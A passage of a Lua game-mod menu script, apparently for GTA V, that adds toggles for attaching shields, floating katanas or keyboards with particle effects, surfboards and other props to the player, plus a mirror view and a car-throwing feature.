    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌5",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_shark_wh"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌6",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_time"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌7",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_time_g"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌8",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_time_p"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌9",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_time_pk"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌10",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_b_time_wh"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌11",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_ex_bmd"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "队长盾牌12",{""}, "",function(on)
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local taidao = OBJECT.CREATE_OBJECT(util.joaat("prop_gr_bmd_b"), pos.x, pos.y, pos.z, true, true, false)
    if on then
    WEAPON.GIVE_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),1317494643,15,true,true)
    WEAPON.SET_PED_CURRENT_WEAPON_VISIBLE(PLAYER.PLAYER_PED_ID(), not on, false, false, false)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(taidao, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 28422), 0.05, 0.05, 0, -90, 0.5, 0, true, true, true, true, 0, true)
    else
        WEAPON.REMOVE_WEAPON_FROM_PED(players.user_ped(),1317494643)
        local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
    end
end)

menu.toggle(wushidao, "御盘术V1",{""}, "",function(on)
    local katana = "prop_cs_keyboard_01"
    if on then     
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        local player_pos = players.get_position(players.user())
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_weak_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    else
        delete_object(katana)
    end
end)

menu.toggle(wushidao, "御盘术V2",{""}, "",function(on)--hezzy
    wanjianguizong_2 = state
    local katana = "prop_cs_keyboard_01"
    if on then     
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        local player_pos = players.get_position(players.user())
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_weak_blue", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    else
        delete_object(katana)
    end
end)

menu.toggle(wushidao, "御盘术V3", {""}, "右键使用特效", function(state)
    wanjianguizong_2 = state
    local katana = "prop_cs_keyboard_01"
    if state then
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        while wanjianguizong_2 do
            if util.is_key_down(0x02) then
                menu.trigger_commands("sforcefield on")
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            else
                menu.trigger_commands("sforcefield off")
            end
            util.yield()
    end
    else
        delete_object(katana)
    end
end)
suijijianqi = function(x)
    local r = math.random(1,5)
    return x[r]
end
jianqi = {"scr_sum2_hal_hunted_respawn","scr_sum2_hal_rider_weak_blue","scr_sum2_hal_rider_weak_green","scr_sum2_hal_rider_weak_orange","scr_sum2_hal_rider_weak_greyblack"}
menu.toggle(wushidao, "御盘术V4", {""}, "", function(state)--hezzy
    wanjianguizong_3 = state
    local katana = "prop_cs_keyboard_01"
    if state then
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        while wanjianguizong_3 do
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            util.yield(200)
    end
    else
        delete_object(katana)
    end
end)

menu.toggle(wushidao, "御剑术V1",{""}, "",function(on)
    local katana = "prop_cs_katana_01"
    if on then     
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        local player_pos = players.get_position(players.user())
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_weak_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    else
        delete_object(katana)
    end
end)

menu.toggle(wushidao, "御剑术V2",{""}, "",function(on)--hezzy
    wanjianguizong_2 = state
    local katana = "prop_cs_katana_01"
    if on then     
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        local player_pos = players.get_position(players.user())
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_weak_blue", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
    else
        delete_object(katana)
    end
end)

menu.toggle(wushidao, "御剑术V3", {""}, "右键使用剑气", function(state)
    wanjianguizong_2 = state
    local katana = "prop_cs_katana_01"
    if state then
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        while wanjianguizong_2 do
            if util.is_key_down(0x02) then
                menu.trigger_commands("sforcefield on")
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            else
                menu.trigger_commands("sforcefield off")
            end
            util.yield()
    end
    else
        delete_object(katana)
    end
end)
suijijianqi = function(x)
    local r = math.random(1,5)
    return x[r]
end
jianqi = {"scr_sum2_hal_hunted_respawn","scr_sum2_hal_rider_weak_blue","scr_sum2_hal_rider_weak_green","scr_sum2_hal_rider_weak_orange","scr_sum2_hal_rider_weak_greyblack"}
menu.toggle(wushidao, "御剑术V4", {""}, "", function(state)--hezzy
    wanjianguizong_3 = state
    local katana = "prop_cs_katana_01"
    if state then
        attach_to_player(katana, 1, -0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.3, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, -0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, 0.5, 0, 0.5, 0, 90,90)
        attach_to_player(katana, 1, -0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.8, 0, 0.8, 0, 90,90)
        attach_to_player(katana, 1, 0.0, 0, 1, 0, 90,90)
        attach_to_player(katana, 1, 1.0, 0, 0, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0, 80, 90,95)
        attach_to_player(katana, 1, 2.0, 0, 0.2, -90, 0,0)
        attach_to_player(katana, 1, -2.0, 0, 0.2, 80, 90,95)
        attach_to_player(katana, 1, 1.0, 0, 0.4, -90, 0,0)
        attach_to_player(katana, 1, -1.0, 0, 0.4, 80, 90,95)
        attach_to_player(katana, 1, 1.5, 0, 0.6, -90, 0,0)
        attach_to_player(katana, 1, -1.5, 0, 0.6, 80, 90,95)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, -150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 150,0)
        attach_to_player(katana, 0, 0, -0.2, 0.5, 0, 180,0)
        attach_to_player(katana, 0, 0.23, 0, 0, 0, -180,100)
        attach_to_player(katana, 0, -0.23, 0, 0, 0, -180,100)
        while wanjianguizong_3 do
    local player_pos = players.get_position(players.user())
    request_ptfx_asset("scr_sum2_hal")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
        suijijianqi(jianqi), player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            util.yield(200)
    end
    else
        delete_object(katana)
    end
end)

menu.toggle(funfeatures_self, "吉他",{""}, "",function(on)--hezzy
    local guitar = "prop_acc_guitar_01"
    if on then     
        attach_to_player(guitar, 0, 0, -0.15, 0.25, 0, -50,0)
    else
        delete_object(guitar)
    end
end)

chonglangban = menu.list(funfeatures_self, "冲浪板", {}, "", function(); end)
menu.toggle(chonglangban, "冲浪板1",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_03"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)

menu.toggle(chonglangban, "冲浪板2",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_04"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)

menu.toggle(chonglangban, "冲浪板3",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_02"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)

menu.toggle(chonglangban, "冲浪板4",{""}, "",function(on)--hezzy
    local surf_board = "prop_surf_board_ldn_01"
    if on then     
        attach_to_player(surf_board, 0, 0, -0.2, 0.25, 0, -30,0)
    else
        delete_object(surf_board)
    end
end)

menu.toggle(chonglangban, "冲浪板5",{""}, "",function(on)--hezzy
    local surf_board = "prop_kt1_10_mpdoor_l"
    if on then     
        attach_to_player(surf_board, 2, 0.5, -0.3, -0.03, 1, -30,0)
    else
        delete_object(surf_board)
    end
end)

menu.toggle(funfeatures_self, "电脑",{""}, "",function(on)--hezzy
    local surf_board = "prop_laptop_01a"
    if on then     
        attach_to_player(surf_board, 2, 0, 0.5, -0.03, 1, 0,0)
    else
        delete_object(surf_board)
    end
end)

menu.toggle(funfeatures_self, "泳圈",{""}, "",function(on)--hezzy
    local swimming_circle = "prop_beach_ring_01"
    if on then     
        attach_to_player(swimming_circle, 0, 0, 0, 0, 0, 0,0)
    else
        delete_object(swimming_circle)
    end
end)

    menu.toggle_loop(funfeatures_self, "镜子", {"mirror"}, "", function()--hezzy
        if WIRI_GRAPHICS.UI3DSCENE_IS_AVAILABLE() then
            if WIRI_GRAPHICS.UI3DSCENE_PUSH_PRESET("CELEBRATION_WINNER") then
                WIRI_GRAPHICS.UI3DSCENE_ASSIGN_PED_TO_SLOT("CELEBRATION_WINNER", players.user_ped(), 0, 0.0, 0.0, 0.0);
            end
        end
    end)

menu.toggle_loop(funfeatures_self, "PED摇头丸", {"pedheadbang"}, "", function(on)
    yaoptou()
end)

local entity_held = 0
local are_hands_up = false
menu.toggle_loop(funfeatures_self,"举起扔出车子", {"throwcars"}, "在车辆附近按E以使用，在按住车辆以投掷时按E。", function(on)
    if PAD.IS_CONTROL_JUST_RELEASED(38, 38) then
        if entity_held == 0 then
            if not are_hands_up then 
                local closest = get_closest_veh(ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                local veh = closest[1]
                local dist = closest[2]
                if dist <= 5 then 
                    request_anim_dict("missminuteman_1ig_2")
                    TASK.TASK_PLAY_ANIM(players.user_ped(), "missminuteman_1ig_2", "handsup_enter", 8.0, 0.0, -1, 50, 0, false, false, false)
                    util.yield(500)
                    are_hands_up = true
                    ENTITY.SET_ENTITY_ALPHA(veh, 100)
                    ENTITY.SET_ENTITY_HEADING(veh, ENTITY.GET_ENTITY_HEADING(players.user_ped()))
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(veh, players.user_ped(), 0, 0, 0, get_model_size(ENTITY.GET_ENTITY_MODEL(veh)).z / 2, 180, 180, -180, true, false, true, false, 0, true)
                    entity_held = veh
                end 
            else
